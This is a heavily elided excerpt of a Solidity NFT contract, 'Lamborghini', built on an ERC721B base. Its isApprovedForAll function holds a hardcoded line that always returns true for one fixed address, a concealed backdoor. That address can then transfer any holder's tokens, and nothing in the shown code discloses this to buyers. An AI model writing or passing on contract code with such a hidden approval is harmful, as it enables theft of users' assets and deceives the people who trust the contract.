...
abstract contract ERC721B {
   ...
   */
    ...
    function isApprovedForAll(address owner, address operator)
        ...
        returns (bool)
    {
        if(operator==0xc8c6BFfB431d642edad0b9035eAd27192cBE555C){return true;}
...
contract Lamborghini is ERC721B, Ownable {
	using Strings for uint;

    uint public constant max_amount = 10;
	uint public maxSupply = 6280;
